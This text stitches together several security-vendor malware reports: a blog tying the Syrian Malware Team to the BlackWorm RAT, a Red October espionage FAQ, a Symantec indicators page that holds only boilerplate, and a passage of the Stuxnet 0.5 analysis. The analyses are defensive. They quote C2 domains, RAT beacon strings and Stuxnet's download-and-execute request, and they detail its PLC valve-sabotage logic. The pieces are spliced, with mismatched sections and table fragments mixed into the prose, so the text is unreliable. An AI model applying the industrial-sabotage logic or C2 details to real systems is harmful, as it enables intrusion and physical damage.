Connecting the Dots: Syrian Malware Team Uses BlackWorm for
Attacks</heading>
The Syrian Electronic Army has made news for its recent attacks on major communications websites,
Forbes, and an alleged attack on CENTCOM.While these attacks garnered public attention, the activities
of another group – The Syrian Malware Team – have gone largely unnoticed.The group’s activities
prompted us to take a closer look.We discovered this group using a .NET based RAT called BlackWorm to
infiltrate their targets.The Syrian Malware Team is largely pro-Syrian government, as seen in one of their banners featuring
Syrian President Bashar al-Assad.Based on the sentiments publicly expressed by this group it is likely that
they are either directly or indirectly involved with the Syrian government.Further certain members of the
Syrian Malware Team have ties to the Syrian Electronic army (SEA) known to be linked to the Syrian
government.This indicates that the Syrian Malware Team may also be possibly an offshoot or part of the
SEA.<figure></figure>

Banner used by the Syrian Malware Team
</section>
<section>
<heading>
BlackWorm Authorship
</heading>
We found at least two distinct versions of the BlackWorm tool, including an original/private version
(v0.3.0) and the Dark Edition (v2.1).The original BlackWorm builder was co-authored by Naser Al
Mutairi from Kuwait, better known by his online moniker ‘njq8′.He is also known to have coded njw0rm,
njRAT/LV, and earlier versions of H-worm/Houdini.We found his code being used in a slew of other
RATs such as Fallaga and Spygate.BlackWorm v0.3.0 was also co-authored by another actor, Black Mafia.<figure></figure>
About section within the original version of BlackWorm builder

Within the underground development forums, it’s common for threat actors to collaborate on toolsets.Some write the base tools that other attackers can use; others modify and enhance existing tools.The BlackWorm builder v2.1 is a prime example of actors modifying and enhancing current RATs.After
njq8 and Black Mafia created the original builder, another author, Black.Hacker, enhanced its feature set.<figure></figure>

About section within BlackWorm Dark Edition builder


<figure></figure>

Black.Hacker’s banner on social media


<figure></figure>

As an interesting side note, ‘njq8′ took down his blog in recent months and announced a cease in all
malware development activity on his Twitter and Facebook account, urging others to stop as well.This is
likely a direct result of the lawsuit filed against him by Microsoft.</section>
<section>
<heading>
BlackWorm RAT Features
</heading>
The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload, but doesn’t allow any
configuration other than the IP address for command and control (C2).BlackWorm v2.1 was released on a prolific underground forum where information and code is often
shared, traded and sold.<figure></figure>
BlackWorm v2.1 has the same abilities as the original version and additional functionality, including
bypassing UAC, disabling host firewalls and spreading over network shares.Unlike its predecessor, it also
allows for granular control of the features available within the RAT.These additional controls allow the
RAT user to enable and disable features as needed.Binary output can be also be generated in multiple
formats, such as .exe, .src and .dll.<figure></figure>


BlackWorm Dark Edition builder
</section>
<section>
<heading>
Syrian Malware Team
</heading>
We observed activity from the Syrian Malware Team going as far back as Jan. 1, 2011.Based on Facebook
posts, they are allegedly directly or indirectly involved with the Syrian government.Their Facebook page
shows they are still very active, with a post as recent as July 16th, 2014.<figure></figure>

Syrian Malware Team’s Facebook page

The Syrian Malware Team has been involved in everything from profiling targets to orchestrating attacks
themselves.There are seemingly multiple members, including:

Partial list of self-proclaimed Syrian Malware Team members

Some of these people have posted malware-related items on Facebook.<figure></figure>
Facebook posting of virus scanning of files

While looking for Dark Edition samples, we discovered a binary named svchost.exe (MD5:
015c51e11e314ff99b1487d92a1ba09b).We quickly saw indicators that it was created by BlackWorm Dark
Edition.Additional pivoting off of svchost.exe brought us to three additional samples apparently built with
BlackWorm Dark Edition.E.exe, (MD5: a8cf815c3800202d448d035300985dc7) a binary that drew our
attention, looked to be a backdoor with the Syrian Malware strings within it.<figure></figure>
When executed, the binary beacons to aliallosh.sytes.net on port 1177.This C2 has been seen in multiple
malware runs often associated with Syria.The command structure of the binary is:

!0/j|n\Syrian Malware/j|n\{Hostname}/j|n\{Username}/j|n\USA/j|n\Win 7 Professional SP1
x86/j|n\No/j|n \0.1/j|n\/j|n\{ActiveWindowName}/j|n\[endof]

Finally, pivoting to another sample, 1gpj.srcRania (MD5:f99c15c62a5d981ffac5fdb611e13095), the same
strings were present.The string “Rania” used as a lure was in Arabic and likely refers to the prolific Queen
Rania of Jordan.<figure></figure>


The traffic is nearly identical to the other samples we identified and tied to the Syrian Malware Team.!1/j|n\C:\Documents and Settings\{Username}\Local Settings\Application DataldoDrZdpkK.jpg –
Windows Internet Explorer[endof]!0/j|n\Syrian Malware/j|n\{Hostname}/j|n\
{Username}/j|n\USA/j|n\Win XP ProfessionalSP2 x86/j|n\No/j|n\0.1/j|n\/j|n\C:\Documents and
Settings\{Username}\Local Settings\Application DataldoDrZdpkK.jpg – {ActiveWindowName}/j|n\
[endof]
</section>
<section>
<heading>
Conclusion
</heading>
Determining which groups use which malware is often very difficult.Connecting the dots between actors
and malware typically involves looking at binary code, identifying related malware examples associated
with those binaries, and reviewing infection vectors, among other things.This blog presents a prime example of the process of attribution.We connected a builder with malware
samples and the actors/developers behind these attacks.This type of attribution is key to creating
actionable threat intelligence to help proactively protect organizations.This entry was posted in Threat Intelligence, Threat Research and tagged advanced threat, syrian cyber
threats, Syrian Electronic Army, Syrian Malware Team, threat group by Kyle Wilhoit and Thoufique Haq.Bookmark the permalink.</section>
</doc><doc>
<section>
The "Red October" Campaign - An Advanced Cyber Espionage
Network Targeting Diplomatic and Government Agencies
Here's a link to the full paper (part 1) about our Red October research.During the next
days, we'll be publishing Part 2, which contains a detailed technical analysis of all the
known modules.Please stay tuned.During the past five years, a high-level cyber-espionage campaign has successfully infiltrated computer
networks at diplomatic, governmental and scientific research organizations, gathering data and
intelligence from mobile devices, computer systems and network equipment.Kaspersky Lab's researchers have spent several months analyzing this malware, which targets specific
organizations mostly in Eastern Europe, former USSR members and countries in Central Asia, but also in
Western Europe and North America.<figure></figure>


The campaign, identified as "Rocra", short for "Red October", is currently still active with data being sent
to multiple command-and-control servers, through a configuration which rivals in complexity the
infrastructure of the Flame malware.Registration data used for the purchase of C&C domain names and
PE timestamps from collected executables suggest that these attacks date as far back as May 2007.Some key findings from our investigation:

     The attackers have been active for at least five years, focusing on diplomatic and governmental
     agencies of various countries across the world.Information harvested from infected networks is
     reused in later attacks.For example, stolen credentials were compiled in a list and used when the
     attackers needed to guess passwords and network credentials in other locations.To control the
     network of infected machines, the attackers created more than 60 domain names and several server
     hosting locations in different countries (mainly Germany and Russia).The C&C infrastructure is
     actually a chain of servers working as proxies and hiding the location of the true -mothership-
     command and control server.The attackers created a multi-functional framework which is capable of applying quick extension of
     the features that gather intelligence.The system is resistant to C&C server takeover and allows the
     attacker to recover access to infected machines using alternative communication channels.Beside traditional attack targets (workstations), the system is capable of stealing data from mobile
     devices, such as smartphones (iPhone, Nokia, Windows Mobile); dumping enterprise network
     equipment configuration (Cisco); hijacking files from removable disk drives (including already
     deleted files via a custom file recovery procedure); stealing e-mail databases from local Outlook
     storage or remote POP/IMAP server; and siphoning files from local network FTP servers.We have observed the use of at least three different exploits for previously known vulnerabilities:
     CVE-2009-3129 (MS Excel), CVE-2010-3333 (MS Word) and CVE-2012-0158 (MS
     Word).The earliest known attacks used the exploit for MS Excel and took place in 2010 and 2011,
     while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012.<figure></figure>
The exploits from the documents used in spear phishing were created by other attackers and
employed during different cyber attacks against Tibetan activists as well as military and energy
sector targets in Asia.The only thing that was changed is the executable which was embedded in the
document; the attackers replaced it with their own code.<figure></figure>
Sample fake image used in one of the Rocra spear phishing attacks.During lateral movement in a victim's network, the attackers deploy a module to actively scan the
      local area network, find hosts vulnerable for MS08-067 (the vulnerability exploited by Conficker) or
      accessible with admin credentials from its own password database.Another module used collected
      information to infect remote hosts in the same network.Based on registration data of the C&C servers and numerous artifacts left in executables of the
      malware, we strongly believe that the attackers have Russian-speaking origins.Current attackers
      and executables developed by them have been unknown until recently, they have never related to
      any other targeted cyber attacks.Notably, one of the commands in the Trojan dropper switches the
      codepage of an infected machine to 1251 before installation.This is required to address files and
      directories that contain Cyrillic characters in their names.</section>
<section>
<heading>
Rocra FAQ:</heading>

What is Rocra?Where does the name come from?Was Operation Rocra targeting any
specific industries, organizations or geographical regions?Rocra (short for "Red October") is a targeted attack campaign that has been going on for at least five years.It has infected hundreds of victims around the world in eight main categories:
   1.Government
   2.Diplomatic / embassies
   3.Research institutions
   4.Trade and commerce
   5.Nuclear / energy research
   6.Oil and gas companies
   7.Aerospace
   8.Military

It is quite possible there are other targeted sectors which haven't been discovered yet or have been
attacked in the past.</section>
<section>
How and when was it discovered?We have come by the Rocra attacks in October 2012, at the request of one of our partners.By analysing
the attack, the spear phishing and malware modules, we understood the scale of this campaign and started
dissecting it in depth.Who provided you with the samples?</section>
<section>
Our partner who originally pointed us to this malware prefers to remain anonymous.</section>
<section>
How many infected computers have been identified by Kaspersky Lab?How many victims
are there?What is the estimated size of Operation Red October on a global scale?During the past months, we've counted several hundreds of infections worldwide - all of them in top
locations such as government networks and diplomatic institutions.The infections we've identified are
distributed mostly in Eastern Europe, but there are also reports coming from North America and Western
European countries such as Switzerland or Luxembourg.</section>
<section>
Who is behind/responsible for this operation?Is this a nation-state sponsored attack?The information we have collected so far does not appear to point towards any specific location, however,
two important factors stand out:

      The exploits appear to have been created by Chinese hackers.The Rocra malware modules have been created by Russian-speaking operatives.Currently, there is no evidence linking this with a nation-state sponsored attack.The information stolen
by the attackers is obviously of the highest level and includes geopolitical data which can be used by nation
states.Such information could be traded in the underground and sold to the highest bidder, which can be
of course, anywhere.</section>
<section>
Are there any interesting texts in the malware that can suggest who the attackers are?In particular, the word "Zakladka" in Russian can mean:

      "bookmark"
      (more likely) a slang term meaning "undeclared functionality", i.e.in software or hardware.However, it may also mean a microphone embedded in a brick of the embassy building.The C++ class that holds the C&C configuration parameters is called "MPTraitor" and the corresponding
configuration section in the resources is called "conn_a".Some examples include:
</section>
<section>
What kind of information is being hijacked from infected machines?Information stolen from infected systems includes documents with extensions:

txt, csv, eml, doc, vsd, sxw, odt, docx, rtf, pdf, mdb, xls, wab, rst, xps, iau,
cif, key, crt, cer, hse, pgp, gpg, xia, xiu, xis, xio, xig, acidcsa, acidsca,
aciddsk, acidpvr, acidppr, acidssa.In particular, the "acid*" extensions appear to refer to the classified software "Acid Cryptofiler", which is
used by several entities such as the European Union and/or NATO.</section>
<section>
What is the purpose/objective of this operation?What were the attackers looking for by
conducting this sustained cyber-espionage campaign for so many years?The main purpose of the operation appears to be the gathering of classified information and geopolitical
intelligence, although it seems that the information gathering scope is quite wide.During the past five
years, the attackers collected information from hundreds of high profile victims although it's unknown
how the information was used.It is possible that the information was sold on the black market, or used directly.</section>
<section>
What are the infection mechanisms for the malware?Does it have self-propagating (worm)
capabilities?How does it work?Do the attackers have a customized attack platform?The main malware body acts as a point of entry into the system which can later download modules used
for lateral movement.After initial infection, the malware won't propagate by itself - typically, the attackers
would gather information about the network for a few days, identify key systems and then deploy modules
which can compromise other computers in the network, for instance by using the MS08-067 exploit.In general, the Rocra framework is designed for executing "tasks" that are provided by its C&C servers.Most of the tasks are provided as one-time PE DLL libraries that are received from the server, executed in
memory and then immediately discarded.Several tasks however need to be constantly present in the system, i.e.waiting for the iPhone or Nokia
mobile to connect.These tasks are provided as PE EXE files and are installed in the infected machine.</section>
<section>
<list>
Examples of "persistent" tasks

      Once a USB drive is connected, search and extract files by mask/format, including deleted files.Deleted files are restored using a built in file system parser
      Wait for an iPhone or a Nokia phone to be connected.Once connected, retrieve information about
      the phone, its phone book, contact list, call history, calendar, SMS messages, browsing history
      Wait for a Windows Mobile phone to be connected.</section>
<section>
Was the malware limited to only workstations or did it have additional capabilities, such as
a mobile malware component?Several mobile modules exist, which are designed to steal data from several types of devices:
<list>
      Windows Mobile
      iPhone
      Nokia
</list>
These modules are installed in the system and wait for mobile devices to be connected to the victim's
machine.When a connection is detected, the modules start collecting data from the mobile phones.</section>
<section>
How many variants, modules or malicious files were identified during the overall duration
of Operation Red October?During our investigation, we've uncovered over 1000 modules belonging to 30 different module
categories.These have been created between 2007 with the most recent being compiled on 8th Jan 2013.Here's a list of known modules and categories:
<figure></figure>
</section>
<section>
Were initial attacks launched at select "high-profile" victims or were they launched in
series of larger (wave) attacks at organizations/victims?All the attacks are carefully tuned to the specifics of the victims.For instance, the initial documents are
customized to make them more appealing and every single module is specifically compiled for the victim
with a unique victim ID inside.Later, there is a high degree of interaction between the attackers and the victim - the operation is driven
by the kind of configuration the victim has, which type of documents the use, installed software, native
language and so on.Compared to Flame and Gauss, which are highly automated cyberespionage
campaigns, Rocra is a lot more "personal" and finely tuned for the victims.</section>
<section>
Is Rocra related in any way to the Duqu, Flame and Gauss malware?Simply put, we could not find any connections between Rocra and the Flame / Tilded platforms.</section>
<section>
How does Operation Rocra compare to similar campaigns such as Aurora and Night
Dragon?Any notable similarities or differences?Compared to Aurora and Night Dragon, Rocra is a lot more sophisticated.During our investigation we've
uncovered over 1000 unique files, belonging to about 30 different module categories.Generally speaking,
the Aurora and Night Dragon campaigns used relatively simple malware to steal confidential information.With Rocra, the attackers managed to stay in the game for over 5 years and evade detection of most
antivirus products while continuing to exfiltrate what must be hundreds of Terabytes by now.</section>
<section>
How many Command & Control servers are there?Did Kaspersky Lab conduct any forensic
analysis on them?During our investigation, we uncovered more than 60 domain names used by the attackers to control and
retrieve data from the victims.The domain names map to several dozen IPs located mostly in Russia and
Germany.Here's an overview of the Rocra's command and control infrastructure, as we believe it looks from our
investigations:
<figure></figure>
More detailed information about the Command and Control servers will be revealed at a later date.</section>
<section>
Did you sinkhole any of the Command & Control servers?We were able to sinkhole six of the over 60 domains used by the various versions of the malware.During
the monitoring period (2 Nov 2012 - 10 Jan 2013), we registered over 55,000 connections to the sinkhole.The number of different IPs connecting to the sinkhole was 250.From the point of view of country distribution of connections to the sinkhole, we have observed victims in
39 countries, with most of IPs being from Switzerland.Kazakhstan and Greece follow next.<figure></figure>
Sinkhole statistics - 2 Nov 2012 - 10 Jan 2013
</section>
<section>
Is Kaspersky Lab working with any governmental organizations, Computer Emergency
Response Teams (CERTs), law enforcement agencies or security companies as part of the
investigation and disinfection efforts?Kaspersky Lab, in collaboration with international organizations, Law Enforcement, Computer Emergency
Response Teams (CERTs) and other IT security companies is continuing its investigation of Operation
Red October by providing technical expertise and resources for remediation and mitigation procedures.Kaspersky Lab would like to express their thanks to: US-CERT, the Romanian CERT and the Belarusian
CERT for their assistance with the investigation.If you are a CERT and would like more information about infections in your country, please contact us at
theflame@kaspersky.com.Here's a link to the full paper (part 1) about our Red October research.During the next
days, we'll be publishing Part 2, which contains a detailed technical analysis of all the
known modules.Please stay tuned.See our accompanying blog for more information.This document details the following types of indictors:

-      Network
-      File
-      System
-      Email

The contents of this document are indicators only and may match legitimate services or applications.Additional verification is required to confirm an actual compromise.</section>

<section>
<heading>Network indicators</heading>
Network based indications of possible compromise by the comment crew attackers.Our innovative products
                                                         and services protect people and information in any environment—from
                                                         the smallest mobile device to the enterprise data center to cloud-based
                                                         systems.Our industry-leading expertise in protecting data, identities,
                                                         and interactions gives our customers confidence in a connected world.More information is available at www.symantec.com or by connecting
                                                         with Symantec at go.symantec.com/socialmedia

                                                         Headquartered in Mountain View, Calif., Symantec has operations in 40
                                                         countries.More information is available at www.symantec.com

                                                         For specific country offices and contact numbers, please visit our
                                                         website.NO WARRANTY.The technical information is being delivered to you as is and Symantec
                                                         Corporation makes no warranty as to its accuracy or use.Any use of the technical
                                                         documentation or the information contained herein is at the risk of the user.Documentation may include technical or other inaccuracies or typographical errors.Symantec reserves the right to make changes without prior notice.Copyright © 2013 Symantec Corporation.All rights reserved.Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered
                                                         trademarks of Symantec Corporation or its affiliates in the U.S. and other countries.Other names may be trademarks of their respective owners

</noncontent>

</doc>This worm became known as the first computer

software threat that was used as a cyber-weapon.The worm was

specifically designed to take control over industrial plant machinery

and making them operate outside of their safe or normal performance

envelope, causing damage in the process.This was a first in the history

of malware.Clues in the code pointed to other versions of the worm which could
potentially perform different actions leaving an open question about
Stuxnet and how it came to be.The wait for the missing link is now
over.Symantec have now discovered an older version of Stuxnet that
can answer the questions about the evolution of Stuxnet.This newly
discovered variant has been dissected and analyzed in detail and here
is a summary of our key findings:

  •	 Stuxnet 0.5 is the oldest known Stuxnet version to be analyzed, in
     the wild as early as November 2007 and in development as early
     as November 2005.•	 Stuxnet 0.5 was less aggressive than Stuxnet versions 1.x and only
     spread through infected Step 7 projects.•	 Stuxnet 0.5 contains an alternative attack strategy, closing valves
     within the uranium enrichment facility at Natanz, Iran, which
     would have caused serious damage to the centrifuges and uranium
     enrichment system as a whole.Stuxnet 0.5: The Missing Link





         Whether Stuxnet 0.5 was successful is unclear, but later versions of Stuxnet were developed using a different
         development framework, became more aggressive, and employed a different attack strategy that changed the
         speeds of the centrifuges instead instead suggesting Stuxnet 0.5 did not completely fulfill the attacker’s goals.More versions of Stuxnet are known to exist, but have never been recovered.The           1.x                June 24, 2012                  Infection stop date
         compile timestamps found within
         most of the code appear unreliable           </table>   
         and generally are in the range of the year 2001.Step 7 project files                               X        X            X       X
         The only method of replication in           USB through Step 7 project files                   X
         Stuxnet 0.5 is through infection of
                                                     USB through Autorun                                         X
         Siemens Step 7 project files.Stuxnet
         0.5 does not exploit any Microsoft          USB through CVE-2010-2568                                                X       X
         vulnerabilities, unlike versions 1.x        Network shares                                              X            X       X
         which came later.Over time, the developers appear to have migrated more towards the Tilded platform.The developers
         actually re-implemented Flamer-platform components using the Tilded platform in later versions.Both the Flamer and Tilded platform code bases are different enough to suggest different developers were
         involved.Stuxnet 0.5 also contains code to attack the valve systems in a uranium enrichment facility rather than
         modifying centrifuge speeds, as in versions 1.x of Stuxnet.</section>
<section>
<heading>Installation and load point</heading>
         Stuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX
         files.Using the Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability (CVE-
         2012-3015), the S7hkimdb.dll file is executed, which then decrypts and injects the main XR00001.MDX Stuxnet
         binary file into the services.exe process.Stuxnet is now executing on the system.Once injected into the services.exe process, a copy of the main Stuxnet binary and a companion DLL that
         implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver.The
         main Stuxnet binary refers to itself as outbreak.dll and is saved to disk as oem7a.pnf.The companion DLL that
         implements the payload refers to itself as installation.dll and saved to disk as oem7w.pnf.When the system is
         booted, the MRXCLS.SYS load point driver will decrypt configuration data stored in the registry, decrypt the
         main Stuxnet binary, and inject it into the Explorer and Step 7 processes.The payload DLL will be decrypted as
         well and injected into the Explorer process.When loading dynamic-link library (DLL) resources, Stuxnet makes
         use of a module that mimics LoadLibrary rather than calling LoadLibrary itself.This technique is likely
         used to avoid security software and was not seen in versions 1.x of Stuxnet.A second driver, PCIBUS.SYS, is also created which causes a forced reboot by generating a BSoD (Blue Screen of
         Death) 20 days after installation.A third driver, USBACC11.SYS, is then installed.This driver is similar to the MRXCLS.SYS driver, but instead
         decrypts and injects DLLs for peer-to-peer and C&C communication into the svchost.exe and Internet Explorer
         processes.The structure and organization as well as resource and export listings of each component is available in
         Appendix D.

         Stuxnet 0.5 also checks the current date in a variety of code paths and will not continue to spread after July 4,
         2009.Certain modules may also not be created or loaded if security software is present.A list is available in
         Appendix B.A variety of additional files are created, including log files and configuration files.A list is available in Appendix
         A.</section>
<section>

<heading>Replication</heading>

         Stuxnet 0.5 uses one form of replication through Step 7 project archives.When a removable drive is inserted in
         an infected system, Stuxnet 0.5 will infect any Step 7 project archives with a .s7p or .zip file name extension on
         the drive.In addition, Step 7 project archives on the local disk will also be infected.Therefore Stuxnet 0.5 spreads to additional machines through removable drives or through human-initiated
         sharing of infected Step 7 project archives, for example through email.Stuxnet 0.5 infects Step 7 project archives in the same manner as Stuxnet 1.x versions (as described in W32.<footer>                                                                                                                                   Page 3</footer>
<header>
                                                                                                    Stuxnet 0.5: The Missing Link
Security Response</header>



         Stuxnet Dossier, Step 7 Project File Infections).The following is an example file listing of an infected Step 7
         project file.ApiLog/Types – modified to trigger DLL loading vulnerability
         XUTILS/links/S7P00001.DBF – configuration file
         XUTILS/listen/S7000001.MDX – payload DLL (installation.dll)
         XUTILS/listen/XR000000.MDX – main Stuxnet binary (outbreak.dll)
         hOmSave7/subfolder/s7hkimdb.dll - loader
</section>
<section>
<heading>Command-and-control</heading>
         Similar to Stuxnet 1.x versions, Stuxnet 0.5 has limited command-and-control ability.In particular, Stuxnet
         0.5 does not provide fine grained control to its authors.Instead, Stuxnet 0.5 can only download new code and
         update itself.Stuxnet needs to ultimately spread on isolated networks with no Internet access, therefore it has
         been designed to be autonomous to reduce the need for robust and fine grained command-and-control.Stuxnet
         0.5 also uses a secondary peer-to-peer mechanism to propagate these code updates to peers on networks
         inaccessible to the broader Internet.Command-and-control is implemented by the inetpsp.dll file while peer-to-peer communications are
         implemented by the netsimp32.dll file.Both files are loaded by the usbacc11.sys driver and then injected into
         the svchost.exe and iexplore.exe processes.Stuxnet 0.5 has four C&C servers, all of which are now either unavailable or have since been registered by an
         unrelated party:
         •	 smartclick.org
         •	 best-advertising.net
         •	 internetadvertising4u.com
         •	 ad-marketing.net
         Interestingly, Stuxnet 0.5 is programmed to stop contacting the C&C server after January 11, 2009, even though
         the threat is programmed to only stop spreading after a later date of July 4, 2009.Figure 1
         The C&C server domains were           <figure></figure>
         created in 2005 and all displayed    Internet advertising agency homepage for Stuxnet C&C servers
         the same front page purporting
         to be an Internet advertising
         agency named Media Suffix
         (figure 1) with the tag line
         “Believe What the Mind Can
         Dream”.The servers were hosted on
         commercial hosting providers
         in the United States, Canada,
         France, and Thailand.The fact
         that these domains were in
         operation since 2005, suggests
         that the Stuxnet project started
         more than seven years ago.Next, Stuxnet 0.5 sends the following request:
<list>
         http://<domain>/cgi/click.php?xite=xx&num=yy&c=1&j=%x&k=%x&l=%x
</list>
         This may download and execute a file if an update is available.The final target network for Stuxnet 0.5 was likely isolated from the Internet.To allow updates to reach these
         machines, Stuxnet 0.5 also used a peer-to-peer mechanism.As long as one updated version was introduced into
         this network—for example through an infected USB key—all the other infected machines on the network could
         receive updates or new code modules.Stuxnet 0.5 uses Windows mailslots for peer-to-peer communication.Mailslots allow a process to pass a
         message to another process on a remote machine.Stuxnet 0.5 enumerates all machines on the network and
         attempts to connect to a mailslot named \\[REMOTE MACHINE NAME]\mailslot\svchost.It then provides
         a callback mailslot name of \\[LOCAL MACHINE NAME]\mailslot\imnotify.Stuxnet 0.5 uses these mailslots for peer-to-peer communication and to pass code updates.In addition, Stuxnet
         0.5 may configure systems to allow anonymous logins and then provides the following file shares:
<list>
         •	 temp$
         •	 msagent$
         •	 SYSADMIN$
         •	 WebFiles$
</list>
         This allows file retrieval by peer infections.The first DLL, s7otbxdx.dll, is hijacked in order to insert the malicious PLC code.The same technique was used in
         Stuxnet versions 1.x (as described in W32.Stuxnet Dossier, Modifying PLCs).Stuxnet 0.5 hooks fewer exports and
         verifies the CPU is a 417 PLC rather than a 315 PLC, otherwise the behavior remains generally the same.The second DLL, s7aaapix.dll, is used for fingerprinting the target system and building DB8061, a PLC data block
         needed to conduct the attack.The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the
         export with magic values (0x91E55A3D, 0x996AB716, 0x4A5CBB03) in order to build or provide a previously
         built DB8061 data block for injection.Stuxnet hijacks AUTDoVerb in order to monitor any “DOWNLOAD” verb
         actions, which signifies the fingerprinting and building of DB8061 must occur again in order to ensure the target
         system is still correctly configured.Stuxnet v0.500 Stuxnet v1.xxx
         Through the hijacked export, Stuxnet 0.5 will receive a                 s7_event                s7_event
         pointer to the most recently used block (PLC programs                                           s7ag_bub_cycl_read_create
         consist of code and data blocks).Stuxnet 0.5 will then                                         s7ag_bub_read_var
         traverse the project structure in order to find the symbols
                                                                                                         s7ag_bub_read_var_seg
         used by the S7 Program in the active project.Symbols
         are human designated labels representing each device                                            s7ag_bub_write_var
         controlled by the PLC.The symbol labels loosely follow the                                     s7ag_bub_write_var_seg
         ANSI/ISA S5.1 Instrumentation Symbols and Identification                                        s7ag_link_in
         standard used in Piping and Instrumentation Diagrams
                                                                                 s7ag_read_szl           s7ag_read_szl
         (P&ID).s7ag_test               s7ag_test
         Stuxnet 0.5 uses these labels for both fingerprinting and               s7blk_delete            s7blk_delete
         determining the addresses of each device in order to modify             s7blk_findfirst         s7blk_findfirst
         the behavior of those devices.s7blk_findnext          s7blk_findnext

         Symbol label parsing                                                    s7blk_read              s7blk_read
                                                                                 s7blk_write             s7blk_write
         The target system must be a SIMATIC 400 Station
         (0x14109A) or SIMATIC H-Station (0x141342), which use                                           s7db_close
         417 PLCs.The symbol labels must match the format:                      s7db_open               s7db_open

         <delimiter><FunctionIdentifier><delimiter><C
         ascadeModule><delimiter><CascadeNumber><Dev                               </table>
         iceNumber>
         A valve in module A21, also in cascade 8, and associated with centrifuge 160, would have the symbol label PV-
         A21-8-160, for example.Each field is defined as follows:

         Delimiter
         Either space (“ “), hyphen (“-”), underscore (“_”), or not present at all.FunctionIdentifer
         A string that matches a set of strings (available in Appendix C) that loosely follows the ANSI/ISA S5.1
         Instrumentation Symbols and Identification standard.If the string is “PIA” (Pressure Indicator Alarm), it is
         expected to be followed by a one digit number.These strings will represent the device type (a valve, a transducer,
         or a status light, for instance).CascadeModule
         Must be the string “A21” to “A28” inclusive.These strings match cascade modules in Natanz, Iran, seen publicly
         described as “A24”, “A26”, and “A28”.CascadeNumber
         Single character that is in the letter range A to R. If it is not in this letter range, it checks to see if it is two digits
         in the decimal range 00 to 18.The device type mappings to function identifiers are
         available in Appendix C.

               Device type 0
               A string of digits: If the length of the digits is less than three, the device type is changed to device type 6.If
               the length of the digits is greater than or equal to three, the device type is changed to device type 7.Device type 1, 2, 3
               “##”: A two digit number in the range 1 to 25.Device type 4, 5, or 7
               Device type 4, 5, or 7 has three different formats:

                    Format 1
                    “####”: Decoded as two separate two-digit numbers representing the stage number and the centrifuge
                    number within the stage, respectively.The stage number must be in the decimal range 1 to 15, which
                    matches with the known Natanz configuration.For each of these 15 stages, the maximum number of
                    expected centrifuges in each corresponding stage is looked up in the following array.Table 5
                      <table>
                      Stage numbers with expected numbers of centrifuges
                      Stage         1    2    3    4     5     6    7    8    9     10   11    12   13    14   15

                      Max #         2    2    4    6     8     10   12   16   20    24   20    16   12    8    4

                      </table>


                    This means, for example, stage 3 is expected to have a second two digit number equal to 4 or less.This
                    requirement is consistent with the centrifuge arrangement within a cascade.Format 2
                    “###”: A three digit number that must be less than 164, which is the number of centrifuges in a cascade.Format 3
                    “##L”: A two digit number followed by a letter.The letter must be in the range A to D, and the number
                    must be in the decimal range 1 to 43.This arrangement sub-divides each stage into sub-clusters of four.Device type 6
               “##”: A two digit number in the range 1 to 30.Device type 8, 9, B, or C
               “##”: A two digit number in the range 1 to 3.The string must start with the letter S and contain the letter P. If the string is present,
               the device is modified to be device type 0xB instead (Flow Rate Transmitter Controller Output, rather than
               device type 0xA which is Flow Rate Transmitter Controller Input).Based on the symbol fingerprinting, the following table summarizes what devices and labels Stuxnet looks for
         within the symbol table.Modifying the memory at these addresses
         allows the PLC to control and read the behavior of the associated device.For example, the value may be a
         Boolean value turning a switch on or off, or a 16-bit value representing the current temperature of the system.Addresses can be either outputs (the PLC sets the value to modify the behavior of the device) or inputs (the PLC
         reads the value to determine the current state of the device).Device types 0, 1, 5, and B must be output addresses and device types 2, 3, 4, 5, 6, 7, 8, 9, A, and C must be
         input addresses.Values at addresses for device types 0, 1, 2, 3, 4, and 5 must be bit values.Values at addresses for device types
         6, 7, 8, 9, A, B, and C must be 16-bit values.Cascade rating and building DB8061
         After parsing the symbols and addresses for each cascade, the code inspects the configuration of each cascade.Depending on the configuration, a rating is calculated.Certain devices in certain configurations will result in
         higher ratings.When complete, only the six highest-rated cascades have data written to DB8061.Finally, a flag is set signifying DB8061 has been built.This flag is reset to 0 every time the “DOWNLOAD” verb is
         executed.This can take approximately 30 days.State 1 (Record): Take peripheral snapshots and build fake input blocks for replaying later.State 2 (Attack centrifuge valves): Begin replaying fake input signals.Close valves on most centrifuges.State 3 (Secondary pressure reading): Open both centrifuge and feed stage valves in the final stage of a single
         cascade to obtain a low pressure reading.<footer>                                                                                                                                   Page 9</footer>
<header>
                                                                                                    Stuxnet 0.5: The Missing Link
Security Response</header>

         State 4 (Wait for pressure change): Wait for desired pressure change or time limit.This can take up to
         approximately two hours.State 5 (Attack auxiliary valves): Open all auxiliary valves except valves believed to be near the first feed stage
         (stage 10).Wait for three minutes in this state.State 6 (Wait for attack completion): Wait for six minutes while preventing any state changes.State 7 (Finish): Reset and return to state zero.Figure 3
         <figure>
         State flow diagram of 417 PLC device attack code
            </figure>



         State 0:

         The code verifies the system has reached steady state by monitoring the state of each auxiliary valve and the
         amount of elapsed time.•	 The valves must not change state for a period of 300 snapshots.In addition, the code determines if most of the
            centrifuge valves are in the open or closed position.•	 All cascades must be operational for three or more days, or currently be in the down state.•	 At least one cascade must have been operating for more than 35 days, or collectively all cascades must have
            been operating for more than 297 days.•	 Between 3 and 7 of the first 21 auxiliary valves must have been opened in the last 2 days.<footer>                                                                                                                                   Page 10</footer>
<header>
                                                                                                    Stuxnet 0.5: The Missing Link
Security Response</header>



          •	 Most of the pressure readings associated with the auxiliary valves must be within an expected range.Only if these all conditions are met does the code proceed to state 1.State 1:

          There are 21 snapshots of the peripheral I/O values that are taken one second apart.These values are stored for
          replay during the attack.This prevents systems and technicians from realizing the system is no longer operating as
          expected.State 2:

          First, the normal operating pressure is obtained and stored for replay later.For each stage a portion of all the
          centrifuge valves are closed, except in the feed stage (stage 10).The centrifuge valves in the feed stage remain
          completely open, while the centrifuge valves at both the product end and tails end are completely closed.The particular centrifuge valves closed per stage are randomly chosen.The code will randomly chose a starting
          centrifuge valve and then close the next one in order until the last centrifuge valve in the stage.If the total desired
          number of valves to close for that stage has not been reached, the code will continue from the first centrifuge valve
          in the stage until the maximum valves to close are reached.Then, the code obtains a pressure reading at stage 1.The pressure should be relatively low.This value
